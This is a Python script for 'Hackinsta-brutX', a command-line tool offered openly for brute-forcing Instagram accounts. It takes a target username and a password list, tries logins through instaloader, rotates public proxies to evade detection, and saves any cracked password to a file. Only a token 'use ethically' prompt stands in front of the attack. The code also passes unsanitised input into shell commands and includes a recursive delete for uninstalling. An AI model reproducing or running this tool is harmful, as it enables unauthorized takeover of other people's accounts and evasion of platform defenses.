# By github.com/anyon142
# Give me credit if copy my code

import requests
import os
import instaloader
from getpass import getpass
import time
from time import sleep
import subprocess as sub
import random
import sys

def delay_print(s):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        sleep(0.009)

about = """
\033[1;91m[\033[1;92m*\033[1;91m]\033[1;97m Description:

\033[1;91m>>\033[1;92m Hackinsta-brutX is a tool for instagram account bruteforce. And this tool work on both termux and linux. Just Give your target username and a list of password and just forget about it. No need to worry about your anonymity, Because Its first and higest priority is your anonymity. It only attack when proxy is working well. If you don't have any password list then It will take default password list automatically. No need to worry about it. This tool is created using python programming language. This tool will stop attack when password will found and found password will automatically save in a file with target username. 

\033[1;91m[\033[1;92m*\033[1;91m]\033[1;97m Owner:

\033[1;91m>>\033[1;92m Alex Butler [anyon142]

\033[1;91m[\033[1;92m*\033[1;91m]\033[1;97m Released On:

\033[1;91m>>\033[1;92m Github

\033[1;91m[\033[1;92m*\033[1;91m]\033[1;97m Created In:

\033[1;91m>>\033[1;92m Python ( With python3 )

\033[1;91m[\033[1;92m*\033[1;91m]\033[1;97m Supported OS:

\033[1;91m>>\033[1;92m Android (Termux)
\033[1;91m>>\033[1;92m Debian
\033[1;91m>>\033[1;92m Linux OS

"""

def banr():
    print("\033[1;91m")
    os.system('fortune')
    print()
    print("\033[1;41m\033[1;97m  Created By: anyon142  \033[0m")
    print()

menu = """\033[1;91m[\033[1;97m#\033[1;91m]\033[1;92m Select an option:

\033[1;91m[\033[1;97m1\033[1;91m]\033[1;92m Start Attack
\033[1;91m[\033[1;97m2\033[1;91m]\033[1;92m Uninstall
\033[1;91m[\033[1;97m3\033[1;91m]\033[1;92m Follow Us
\033[1;91m[\033[1;97m4\033[1;91m]\033[1;92m About
\033[1;91m[\033[1;97mE\033[1;91m]\033[1;92m Exit

crackerx>> \033[97m"""

fol = '''\033[1;91m[\033[1;97m#\033[1;91m]\033[1;92m Select any option:

\033[1;91m[\033[1;97m1\033[1;91m]\033[1;92m Instagram
\033[1;91m[\033[1;97m2\033[1;91m]\033[1;92m YouTube
\033[1;91m[\033[1;97m3\033[1;91m]\033[1;92m Github
\033[1;91m[\033[1;97m4\033[1;91m]\033[1;92m Telegram Channel
\033[1;91m[\033[1;97m5\033[1;91m]\033[1;92m Telegram Group
\033[1;91m[\033[1;97mB\033[1;91m]\033[1;92m Back
\033[1;91m[\033[1;97mE\033[1;91m]\033[1;92m Exit

crackerx>> \033[97m'''


def main():
    codeList = ["TR", "US-C", "US", "US-W", "CA", "CA-W",
                "FR", "DE", "NL", "NO", "RO", "CH", "GB", "HK"]
    L = instaloader.Instaloader()
    veri_break = "no"

    while True:
        if veri_break == "si":
            break
        USER = ""
        USER = input('\033[91m[\033[97m#\033[91m]\033[92m Enter Target Username: \033[97m')
        if USER == '0hacker_x0':
            print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m You can't BruteForce On This account.")
            exit()
        wl = input("\n\033[91m[\033[97m#\033[91m]\033[92m Enter Passlist Path (Default: src/pass.txt): \033[97m")
        print()
        if wl == "":
            print("\n\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Selected Default password list")
            print()
            wl = 'src/pass.txt'

        dela = int(input("\033[1;91m[\033[1;97m#\033[1;91m]\033[1;92m Time delay between two login ( In seconds ): \033[1;97m"))
        print()
        trys = int(input("\033[1;91m[\033[1;97m#\033[1;91m]\033[1;92m Change proxy (After How password try): \033[1;97m"))
        print()
        print("\033[1;91m[#] \033[1;92mPlease confirm these details")
        print()
        print("\033[1;92m[*]\033[1;97m Target username:\033[1;91m " + USER )
        print("\033[1;92m[*]\033[1;97m Password List selected:\033[1;91m " + wl )
        print("\033[1;92m[*]\033[1;97m Login delay time:\033[1;91m " + str(dela) + " Seconds")
        print("\033[1;92m[*]\033[1;97m Proxy will change after: \033[1;91m" + str(trys) + " Wrong passwords")
        print()
        chk = input('\033[1;91m[\033[1;97m#\033[1;91m]\033[1;92m Everything is correct [y/n]:\033[1;97m] ')
        if chk == "y" or chk == "Y":
            print()
            print("\033[1;91m[*] \033[1;92mThanks for confirmation")
            print()
            print("\033[1;91m[*] \033[1;92mPlease wait Attack is starting")
            print()
            break

        elif chk == "n" or chk == "N":
            print()
            print("\033[1;91m[*] \033[1;92mOkey, Enter again all details")
            print()
            sleep(0.8)

        else:
            print()
            print("\033[1;91m[x] Abort")
            print()
            exit()


    file1 = open(wl, 'r')
    Lines = file1.readlines()
    count = 0


    http_proxy = "http://10.10.1.10:3128"
    https_proxy = "https://10.10.1.11:1080"
    ftp_proxy = "ftp://10.10.1.10:3128"
    proxyDict = {
        "http": "120.236.74.213:9002, 188.123.114.167:80, 185.82.139.1:443, 1.10.231.42:8080",
        "https": "158.69.53.98:9300, 193.201.228.121:80, 31.186.239.245:8080, 112.217.162.5:3128",
        "ftp": "36.91.166.98:8080, 188.132.222.3:8080, 188.132.221.24:8080, 185.230.48.164:32650"
    }


    failed_attempts = 0
    use_proxy = False
    proxy_list = ["120.236.74.213:9002", "188.123.114.167:80", "185.82.139.1:443"]
    proxy_index = 0

    for line in Lines:
        try:
            PASSWORD = ""
            count += 1
            past = ("{}".format(line.strip()))
            PASSWORD = past
            choiceCode = random.choice(codeList)
            time.sleep(dela) 
            
            if use_proxy:
                
                session = requests.Session()
                session.proxies = {"http": proxy_list[proxy_index]}
                L.context._session = session
            L.login(USER, PASSWORD)
            print("\n\033[91m[\033[92m✓\033[91m] \033[97mPassword found: \033[92m"+past)
            print()
            os.system("touch " + USER + ".txt")
            os.system('echo "Username: ' + USER + '" >> ' + USER + '.txt' )
            os.system('echo "Password: ' + past + '" >> ' + USER + '.txt' )
            print("\033[1;91m[\033[1;97m*\033[1;91m] \033[1;92mUsername and password is saved in\033[1;97m: " + USER + ".txt")
            exit()
            veri_break = "si"
            break
        except instaloader.exceptions.BadCredentialsException:
            print("\033[91m[x] \033[1;97m" + past + "\033[1;91m : Wrong password")
            failed_attempts += 1
            if failed_attempts >= trys:

                use_proxy = True
                failed_attempts = 0 
                proxy_index = (proxy_index + 1) % len(proxy_list) 
                print("\n\033[1;91m[\033[1;97mx\033[1;91m]\033[1;92m Changing proxy server: " + proxy_list[proxy_index])
                print()
        except instaloader.exceptions.ConnectionException:
            print("\n\033[1;91m[\033[1;97mx\033[1;91m]\033[1;92m Connection Error...")
            break
        except instaloader.exceptions.InvalidArgumentException:
            print("\n\033[91m[x] Wrong Username")

##==================[ Starting ]=================##

while True:
    os.system('clear')
    os.system('cat src/banner')
    print()
    aw = input("\033[1;93m[#] I will use it Ethically [y/n]: \033[1;97m")
    if aw == "Y" or aw == "y":
        break

    elif aw == "N" or aw == "n":
        print()
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Exiting...")
        sleep(0.5)
        exit()

    else:
        print()

os.system("xdg-open https://youtube.com/@abdallahdz142 >> /dev/null")
sleep(3)

while True:
    os.system('clear')
    banr()
    asd = input(menu)

    if asd == "":
        print()
        print("\033[1;91m[x] No Input delected")
        sleep(0.5)

    elif asd == "01" or asd == "1":
        print()
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Starting Attack Mode")
        os.system('clear')
        banr()
        main()
        exit()

    elif asd == "02" or asd == "2":
        print()
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Uninstalling CrackerX...")
        print()
        os.system("rm -rfv ../CrackerX/")
        print()
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m CrackerX Uninstalled Successfully")
        print()
        sleep(1)
        exit()

    elif asd ==  "03" or asd == "3":
        while True:
            os.system("clear")
            banr()
            ase = input(fol)
            if ase == "":
                print()
                print("\033[1;91m[x] No Input detected")
                sleep(0.5)

            elif ase == "01" or ase == "1":
                print()
                print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Opening my Instagram Profile in your device")
                print()
                sleep(0.5)
                os.system("xdg-open https://instagram.com/0hacker_x0 > /dev/null")
                sleep(2)

            elif ase == "02" or ase == "2":
                print()
                print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Opening my YouTube Channel in your device")
                print()
                sleep(0.5)
                os.system("xdg-open https://youtube.com/@Technolex > /dev/null")
                sleep(2)

            elif ase == "03" or ase == "3":
                print()
                print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Opening my Github Profile in your device")
                print()
                sleep(0.5)
                os.system("xdg-open https://github.com/MrHacker-X > /dev/null")
                sleep(2)

            elif ase == "04" or ase == "4":
                print()
                print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Opening my Telegram Channel in your device")
                print()
                sleep(0.5)
                os.system("xdg-open https://telegram.me/hackwithalex > /dev/null")
                sleep(2)

            elif ase == "05" or ase == "5":
                print()
                print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Opening my Telegram Group in your device")
                print()
                sleep(0.5)
                os.system("xdg-open https://telegram.me/mrhackerx > /dev/null")
                sleep(2)

            elif ase == "b" or ase == "B":
                print()
                print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Coming on main menu...")
                sleep(0.7)
                break

            elif ase == "E" or ase == "e":
                print()
                print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Exiting...")
                sleep(1)
                exit()

            else:
                print()
                print("\033[1;91m[x] Invalid input")
                sleep(0.5)

    elif asd ==  "04" or asd == "4":
        os.system("clear")
        banr()
        delay_print(about)
        print()
        input("\033[1;94mPress ENTER To Continue")

    elif asd == "e" or asd == "E":
        print()
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Exiting...")
        sleep(1)
        print()
        exit()

    else:
        print()
        print("\033[1;91m[x] Invalid input")
        sleep(0.5)


